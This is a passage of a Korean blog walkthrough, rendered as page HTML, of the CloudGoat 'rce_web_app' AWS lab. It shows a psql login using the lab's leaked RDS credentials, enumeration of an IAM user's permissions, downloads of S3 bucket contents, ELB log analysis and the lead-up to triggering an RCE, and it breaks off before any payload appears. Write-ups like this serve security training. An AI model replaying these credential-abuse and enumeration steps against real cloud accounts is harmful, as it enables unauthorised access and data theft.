punctuation\">:</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"InstanceCreateTime\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T04:55:48.745Z\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"PreferredBackupWindow\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"09:34-10:04\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"BackupRetentionPeriod\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"VpcSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"VpcSecurityGroupId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sg-0a6dd31c217ba1c3b\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"active\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">DBInstance</code> 에서 추려할 데이터는 <code class=\"language-text\">Endpoint</code> 값에서 Address 부분이다. 해당 주소는 rds의 인스턴스 id로 ssh상에서 postgresql에 접속할때 필요한 부분이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">psql postgresql<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cgadmin<span class=\"token punctuation\">:</span>Purplepwny2029@cg<span class=\"token operator\">-</span>rds<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>rce<span class=\"token operator\">-</span>web<span class=\"token operator\">-</span>app<span class=\"token operator\">-</span>cgid7ge6zuhcu1<span class=\"token punctuation\">.</span>cklw91kahwum<span class=\"token punctuation\">.</span>us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">.</span>rds<span class=\"token punctuation\">.</span>amazonaws<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">:</span><span class=\"token number\">5432</span><span class=\"token operator\">/</span>cloudgoat\n\npsql postgresql<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cgadmin<span class=\"token punctuation\">:</span>Purplepwny2029@<span class=\"token punctuation\">[</span>rds_instance<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token number\">5432</span><span class=\"token operator\">/</span>cloudgoat\n</code></pre></div>\n<ul>\n<li><code class=\"language-text\">psql</code> 클라이언트를 사용하여 RDS에 연결하고 성공적으로 로그인이 된 것을 확인할 수 있습니다.</li>\n<li>PostgreqSQL 명령을 통해 테이블 을 조회하고 해당 테이블의 구성 내용들을 확인해 보았습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAy0lEQVQY042Q2RKCMAxFiyuiQEspZRMQRBxRn/X/P+w6yahvLg+ZNun05CRCmx2UrrH2c0xmCtN5hIVrMFtoCOFDTEIIJ4Azlfz+Oj+FqJozZFQxkO55eYTNDsiKgetKN9Cm/Ql6A8fLHXHScaTFwDBjO4bYrGcwNSLzf6AiSfunSQ3XswhkybkfllxTcYPlKuGxXyN/A4s0P6Bpr2xh7B6UkxXFeLmhrE68Bm+T8T5/GhIsVBU2QcFG9JHsArllUxnViJMWq3X6F/ABunCN2gPea70AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/838adc98eddf2cf3705df019fa9da748/37523/10.png\"\n        srcset=\"/static/838adc98eddf2cf3705df019fa9da748/e9ff0/10.png 180w,\n/static/838adc98eddf2cf3705df019fa9da748/f21e7/10.png 360w,\n/static/838adc98eddf2cf3705df019fa9da748/37523/10.png 720w,\n/static/838adc98eddf2cf3705df019fa9da748/cc155/10.png 886w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"lara-iam-user-허용가능한-정책-분석\" style=\"position:relative;\"><a href=\"#lara-iam-user-%ED%97%88%EC%9A%A9%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B6%84%EC%84%9D\" aria-label=\"lara iam user 허용가능한 정책 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lara IAM User 허용가능한 정책 분석</h3>\n<ul>\n<li>Lara 역시 mcduck과 마찬가지로 IAM 사용자인 Lara의 AWS Credentail로 사용하 수 있는 권한에 대해 열거를 해보았습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACC0lEQVQoz2VSaY+aYBBmt4eurSAKuFXx4EaUG1lRPNaaNDX90P7///I0M2xNmv0wmTeZyXPNK2R5DcdN4HgJ4ngLN6pg7W7I8j2y4oA4rRCsNwjjHaIsxunm4Porwp/0gt/WBQezgh0UCNZbjHUfguVm8IMSk+kSkjyFKE0giSN0ezpkZQ5R1rkGqoGuRHMDkmziS1+HqM3RHxqQBzPIgzm60hhCWV1xON9Qbr+zCtNO4AUbeMsCrl9gboTMbtoxv7PNEbabQlEX0DQTimqgryzwVRxDeBAhRGmNOD0gSvZYhRUWZgTHy7nitGaSdVQxKFe45dl0vsJI95lEnwWYmyG6vQkEx8/Z+/CbDXVosjVFM6A9W3geORB7OhTNxGji8Zz2aN7uDPG5raLV0dB6UtHuaPjUUiAU5Svq409QT/MTlqsS62jHFcZ7TGYB8s0ZWXFixXn5yk7IEeUmCCIePvQgPEpN/7dEnewYVgz3LT/qpKwoLxwLEdDeOm7IKGsCevwo30sgRVFS86VtL8PMCPkwlpvCdjOoQ4uz81clvGVzLM7Yzznvd4BkdVf/QFacWQUpW4XNAcgahf9SXdkyEVNP8yMLIBICIat3wOhuubm05aR3u6SG/mfxNqciMgKlKHr9GVpP2v+AlAN9C+rEODPWWFgRZ0nW6drL1UtD4jffyXQS3u2ri3eAfwHZ9T0U51OxRAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/37523/11.png\"\n        srcset=\"/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/e9ff0/11.png 180w,\n/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/f21e7/11.png 360w,\n/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/37523/11.png 720w,\n/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/fcbaf/11.png 895w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 Lara는 일부 EC2, RD3, S3 권한이 있는 것을 확인할 수 있습니다. 똑같이 AWS 계정에 S3 bucket들을 나열해 보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABB0lEQVQY0zWPbU+CYABFH19SNgdIaiqCIA8D14h0hq8L1GEtda1a6w/Ul35Av/80bX04u/ds98sVkyTlbpoxSTLmiy2z1Q5nsiWK5xiXNqrWRav30A0Lvd7DknWcUKVlNihXmhTLBhWlRUVpclFtIuaLDdK/wQ9ifD/CC8coUUbPDug7IV1T4nrX503fHZJsdGa5Shi3qSodytUGRsOhpproho3w/DFtM2QgR1x1Q9xBjDTl2S0nwpUjXO8WZxATDBPMzpKC8BFCQxQ1CiUDUTh1/Y/94ZX7NOeUu3zP7viO9fxJun4kzXKWqw35w4HD8Y2n/QtfPwEf3wbTdYdazUaU9PPtf34BO8VxhlAnJCIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/427a3b80f7237304d8ec58cd441ddbf4/37523/12.png\"\n        srcset=\"/static/427a3b80f7237304d8ec58cd441ddbf4/e9ff0/12.png 180w,\n/static/427a3b80f7237304d8ec58cd441ddbf4/f21e7/12.png 360w,\n/static/427a3b80f7237304d8ec58cd441ddbf4/37523/12.png 720w,\n/static/427a3b80f7237304d8ec58cd441ddbf4/1cfc2/12.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 계정에는 3개의 Cloud Goat 관련된 Bucket들이 존재하고 S3 bucket의 콘텐츠를 다운로드하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABcElEQVQY02WLS4+aYABFaZxx0WkRwTqZ6IiP0ZQZEPABH1jk6QM10Vk0nV27bbrusr/9NNJlFyc39+Zc6f5hgtoa8LHRRVF17uQOmtJFUbo0VL3aG80ecrP3z5PH1GpdJEnmXU35D2lXvpKkJV/WW7blhTTe4pRvuMmJJN7iBylZfmSzPXM4vfL1x5xw16bTv+e23uamrnJT1ypqtyrS4Xjhym5/Yn84czmdMd5+4R6/cdjsEWFMXpTsyzO7suTnn0e+/75DxAPkRh+1paN9GtBqj5CVLtKzKbgyGs94mswwTIH14mFNA6ZOhDkNcWZrbDfi2QwwPq+ZjFeYVsTwyabzaKAPLXp9k6amIznzNUs/qw7zZYJ77V6KCDZ4ImcV7av0gwIvKFiEGS/zEMdLsGcRlr1iKfLK0QcWkjuPWPopIizwRIYQKU50wPZzprZg4SX4QcbCTxBBTmbEHM2CyAxxnYD+yKap9Wm1h7z/8MBfy+24wh/7zXUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/f8e3cecc08e14ac34a443dcdd67ed0aa/37523/13.png\"\n        srcset=\"/static/f8e3cecc08e14ac34a443dcdd67ed0aa/e9ff0/13.png 180w,\n/static/f8e3cecc08e14ac34a443dcdd67ed0aa/f21e7/13.png 360w,\n/static/f8e3cecc08e14ac34a443dcdd67ed0aa/37523/13.png 720w,\n/static/f8e3cecc08e14ac34a443dcdd67ed0aa/6c745/13.png 893w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 Lara는 <code class=\"language-text\">cg-logs-s3-bucket-rce-web-app-cgid7ge6zuhcu1</code> S3 bucket을 다운 받았으며 해당 파일은 Elastic Load Balancer(ELF) 서비스용 AWS log처럼 확인할 수있다.</li>\n</ul>\n<h3 id=\"elb-로그-수집-및-분석\" style=\"position:relative;\"><a href=\"#elb-%EB%A1%9C%EA%B7%B8-%EC%88%98%EC%A7%91-%EB%B0%8F-%EB%B6%84%EC%84%9D\" aria-label=\"elb 로그 수집 및 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ELB 로그 수집 및 분석</h3>\n<p><strong>Elastic Load Balancing(ELB)</strong></p>\n<ul>\n<li>AWS 배포를 위한 Load Balancer Service이며 ELB는 들어오는 애플리케이션 트래픽을 자동으로 분석하고 트래픽 수요를 충족하도록 리소를 확장할 수 있습니다.</li>\n<li>애플리케이션 트래픽인 AWS EC2 인스턴스, 컨테이너, IP address, Lambda 함수 등 여러 애플리케이션를 대상으로 자동 분산을 진행합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAzklEQVQI1x3MXU+CYABAYa5EBAG3FHixAlIUkBEKCPgVNufW1uq2+/7/XzgtLp6rsx2pu36wK44sVxnxpmQT50yzC3bSsFqmhKtX5o8htgiwbB/HCTjLaz4nFbuBwDKmDJQZI9VGVmZIaXZAzKPeOtnzEm4J/JQoKgkWOUna4C9yVN3FmDyhjgWy4SCbgqHpomgCdeyg6YLhyEKq6jfK/aVXt1dOx3fi7puovVMWB/57vm05nG4U1Zm66fiJ7vymX9yeczzHw3zw0HS3H/4Bdr1W8Kcr5XcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7b411b6be1c3fcd79fef75257e490ce1/37523/14.png\"\n        srcset=\"/static/7b411b6be1c3fcd79fef75257e490ce1/e9ff0/14.png 180w,\n/static/7b411b6be1c3fcd79fef75257e490ce1/f21e7/14.png 360w,\n/static/7b411b6be1c3fcd79fef75257e490ce1/37523/14.png 720w,\n/static/7b411b6be1c3fcd79fef75257e490ce1/83e77/14.png 889w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ELB 로그 분석을 진행하기 위해서 <code class=\"language-text\">elb-log-analyzer</code> 도구를 이용하였습니다. 해당 도구는 NodeJs기반으로 동작하며 웹 애플리케이션 상에서 동작한 모든 URL에 대한 카운팅을 해줍니다.</li>\n</ul>\n<p><a href=\"https://www.npmjs.com/package/elb-log-analyzer\">elb-log-analyzer</a></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB6klEQVQozz2P607bQBCFDUUFSsjFt3i93vVm49i5k4YiShIokDaRWiSkqn2A/un7v8FXeYP640i7c2a+M+NNZ7dsHnbcrbc8bX/w+LjneveT5faV9fqZ9f03Pq+eeHr+zubLnsf7PX+Wr/y9/c22vGbQn5CqEbZY0GimePPFiq+7V1brHevNntXdlo8PL8xXe5bLDT07JzdTjJkiZIlMSm6iK27iBUXHkHQtbd+QpCXnFwle4BtkWqCrClWU9MYjqvmEYjzCjEb0p2PycogalPgiI8wULS2dQpPT6qY0gwTvqIl33MILQo3vpwhrSPs9VNXHTAaoYUE2sNhZ6Tzn2x5mXGJGdXCJrgqiTBPrHD/JeH8e4oUipx1KGn5CMxC0wpQgVbSi1KnTlTQ6yUHthEtfHBQI59U9NawGn11EeLE0BHH2f7iG1WYotTux/rdj6eSG65rI3s7X7h1K5bZ0wCDWNDvCbVinHhJrQOpUp9f1y9r3E+dfxoJGJOiI7NDzBj29CPGULUmVJRCaSOZ0laHbK4hyS6KN+weJIhQaP1HEMkclBi0sUmrCVDlYpDSn9Ya9/oTJ7BO2P2FQXTEcTAlna9rlDdZUKF0hUktuhkg9wGYVLx8W/AruWJ4ldEPJyWnI8UmHo3dt/gGsyvWuoEzP+wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/1cb2f784e3950d5e7c82e8027abb0b12/37523/15.png\"\n        srcset=\"/static/1cb2f784e3950d5e7c82e8027abb0b12/e9ff0/15.png 180w,\n/static/1cb2f784e3950d5e7c82e8027abb0b12/f21e7/15.png 360w,\n/static/1cb2f784e3950d5e7c82e8027abb0b12/37523/15.png 720w,\n/static/1cb2f784e3950d5e7c82e8027abb0b12/59822/15.png 916w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>로그 파일의 URL Access 정보들을 확인할 수 있습니다. 해당 URL로 이동을 해보면 오류가 발생하는데 실제로 실행중인 로드 밸랜서가 있는지 확인을 했습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws elbv2 describe<span class=\"token operator\">-</span>load<span class=\"token operator\">-</span>balancers <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile lara</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAAsTAAALEwEAmpwYAAACUElEQVQ4y42TWW/aQBSFx2AgLN7GC97wgh0vQAJhp4rSZulb1D71//+UU92hRFaaVnk4GjEe7v3OXdjx/gGr9RFVfYfF7R7r5R7O9gXu/IjFbIUsv4EXZEjSGmFUIAlLvA7v8IufsO17CJwQcs9Ef+jiajAGs50M18UaRbVBnC4wdnMoZoqREcHgERQtQLtjQO5yyF0TnS6HIttQOw6uWjrkjgHW0iC1dbRkA6zXdzBSA3ArQZQs4AUlLHsKzZjAdnMhP6zg+gW4lcK0p1D4BJoVw/ELmM5UvHHc/ExomDEGioc0W+Lr4ys2u284fPmO3eEJu+MzHp9/4OnlJw6nF4TxHMGkhmEmMO0UppXCHmciGCXr9CwwwmVsKDJt9o+o5wfMFkcU9Rbzm5MoxTRfifuy3goH3StbWLzYvIh+s3aHg0mqyLK8u4cXVijrHeL0RlATiUgqqeJs/vkjMVHIlibq6DZqMlR8MKZ8SPH+rqlzQEmFzmPRFKIiu0RG1i72mgGb518Bmw9I19UGt6t7TOK5OMk+NcL1S2g8+i/dGyE9ojnrD8dQtBDUeZo/VZ+IUlD33tv+Z8D3Fopqi9X6QRBSk6rZXhBS0yjBpwlpKGl9iFDnEUaqLxpDg08b8mlCMTYtTWzGed72yMuNoCLbzVG5SBbiaDfvL2NDo8EkTZBwO4VmRFCGLnQ9BBMPzt/FydSzWiMwaQjW1t72WLoQxskMpLE3hevnCPwMg+gWI6+A59JqpdB5gLE7heXEcKwE20GJk7lE1nPA1TFkatofwt8fs3DoVOEI2AAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/c70826074a1e0b83e09743debcbe3b17/37523/16.png\"\n        srcset=\"/static/c70826074a1e0b83e09743debcbe3b17/e9ff0/16.png 180w,\n/static/c70826074a1e0b83e09743debcbe3b17/f21e7/16.png 360w,\n/static/c70826074a1e0b83e09743debcbe3b17/37523/16.png 720w,\n/static/c70826074a1e0b83e09743debcbe3b17/c4b7c/16.png 903w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>load balancer가 <code class=\"language-text\">active</code> 인 상태로 있고 <code class=\"language-text\">DNSName</code> 을 통해서 웹 애플리케이션에 접속을 해보겠습니다.</li>\n</ul>\n<h3 id=\"웹-애플리케이션-접근-및-rce-취약점-트리거\" style=\"position:relative;\"><a href=\"#%EC%9B%B9-%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98-%EC%A0%91%EA%B7%BC-%EB%B0%8F-rce-%EC%B7%A8%EC%95%BD%EC%A0%90-%ED%8A%B8%EB%A6%AC%EA%B1%B0\" aria-label=\"웹 애플리케이션 접근 및 rce 취약점 트리거 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>웹 애플리케이션 접근 및 RCE 취약점 트리거</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABqUlEQVQoz62QzW7aQBRGvam66aJqCBhjMMbmLwGSKBFKu6ra96NRAUGyoAvaLpJVpL5BpUh9hpAoDTYttlJBzaa28ak8ChVSsuwnHX333pm5c2ekZ8/TGOYWpXKdSrWBli8hyzmUjI6SyQvSSp6sZqDpBoqqoWo6SlYjreZELps7ZPQyG4qKVG0c8L7d5uzslJOTYzrdjvB+v8/xvXe7HXq9Hu12m1arxdG7IwaDAcPhkM+fPvLhy1eGp+cc1vaQcloN2/5BrJ/TKWPLFm7bEyx7wh/fxw8CwnBJEIYEQSB4TK+bb5BkpcTl5ZUo3N39wnEcpo6D67o4rstsNmM2mwv3PA/PW7BYLPjteczncxEvowjf92m+eoukqBVGo2vRMC7GrKaIWa/FiqJIsNIqDsOQ7VoTSc1VGV1d/yuuDjzGcrl8QPwV8Vp84Xb9EKlQ3OX2dsz/UL3xEikpm1xcfMNxXNHYsibCHzC2hI/HlmB9Lc5vbr5TruwjvUjoqLktNL2GUdwlk62SSBbYTBXYTN6TKpBKmySSOrqxI55mFveIh1nf++TpBn8BzCIezrtNzOEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/4a324f0656901eafbe32341ff26f00e9/37523/17.png\"\n        srcset=\"/static/4a324f0656901eafbe32341ff26f00e9/e9ff0/17.png 180w,\n/static/4a324f0656901eafbe32341ff26f00e9/f21e7/17.png 360w,\n/static/4a324f0656901eafbe32341ff26f00e9/37523/17.png 720w,\n/static/4a324f0656901eafbe32341ff26f00e9/302a4/17.png 1080w,\n/static/4a324f0656901eafbe32341ff26f00e9/07a9c/17.png 1440w,\n/static/4a324f0656901eafbe32341ff26f00e9/1acf3/17.png 1596w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 도메인에 접속을 해보니 <code class=\"language-text\">Gold-Star</code>  를 가기위한 티켓을 팔고 있는 거 같고 해당 글을 읽어보면 티겟이 있는 경우 secret URL로 접근을 하라는 메시지가 있다.</li>\n<li>아까 ELB 로그를 통해서 비밀스러운 URL 이 존재한다는 것을 알 수 있었는데</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 329px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 88.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC+klEQVQ4y2VU247iRhRswMaAMfiCsQ3G2PjCfZjMbJKZbPbyOK9JNg+rlSLlS3ZXG2WlKP9cUZ2GQUkeSn369Ok+5VMFanVcozg0AsZePEd1u0W2qbB7OMKLUyg1gmqNBa2OC9V2odRYo3VF2/Cg6m+2KE8beYSxH6fYvNij2Dc4/HCDimenDcqbDWblSsDGx5cnybGuudvJfbMXQFn2BD07RLc/OSN43lt2KEXcD0ZTsLbvTNF3Qjlj3Bvq2qEXa4ZxnoOIiGUuB2QRLZfIdw3m1UqjXGEyzwTzuhTWmnGBxbqSGmHoRXO4Uw1+7mAcwU9SjIIEAddJInNl7PgJ3OlM1yap1I/DmWC6WKJjelBkZLsRHD8WduxyiXnh0owN2MweR/JAmGZwgkTyJMW10/WhFk2JtC6FMlcyWG5rxEWOfN8gWRVIm1JyUbaU8bBudViLEy73KJTBB00rEFaG5UsH0uae4nDw1mAi4OAveQpBQaSG57aukU8W6Q9r6ciYs6F9sk2N7XcHObtYikwWTSV1h8cbyfEeBdp8u9ei/M+gF9NKrPfPZj6bt3WOr3e04cU2NDW/n10ZU1EalZbZPx6lO/cXhgQZn17fSo731i/2AmHI2THomHp+3Au6emVXxpwX91ylvutfZ296Yn5hyFlldaXRVHDDOYpdg0VVorndIt/W8vPKdzWSohCVGXO+VJ5Kr45aB2HYcwIYfggVhmgHEyjLQdv1oYYurChB141heRGcyQzmwIftRWJ22ot+HPoxrGGA8TSRr1T3r97gd/sBf6u3+DJ8wtfsF/yR/oS/op/xQS3wsjfEk5+g8GLc3D3AdedQyjn/24zQNnxk+RGen0O1RlB3r17jt9H3+Kre4KP/hM/Nr/jUvMOfy3d4rzL86Pp4mqZYTRKc7h/hBwtRlWyorNWfol7fI5o1+kGlBlBtG8ocQLX6UMq6wrjY6Px/qOyrdc42EUsxrxwtCjsZhgez48M0/g